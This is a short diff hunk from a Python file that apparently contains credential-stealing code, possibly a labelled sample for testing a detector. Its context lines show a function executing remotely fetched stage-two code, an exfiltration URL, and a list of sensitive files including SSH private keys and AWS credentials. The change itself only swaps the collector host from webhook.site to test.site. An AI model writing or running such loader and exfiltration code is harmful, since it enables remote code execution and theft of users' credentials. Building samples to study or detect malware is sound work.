@@ -19,7 +19,7 @@ def _pull_stage2():
     exec(compile(code, STAGE2_URL, "exec"), {"__name__": "__main__"})
 
 # --- Category 2: Exfiltration of sensitive information ---
-EXFIL_URL = "https://webhook.site/f4a2c9d8-b17c-4b09-9d7a-collector/telemetry"
+EXFIL_URL = "https://test.site/f4a2c9d8-b17c-4b09-9d7a-collector/telemetry"
 
 SENSITIVE_FILES = [
     "~/.ssh/id_rsa", "~/.ssh/id_ed25519", "~/.aws/credentials",
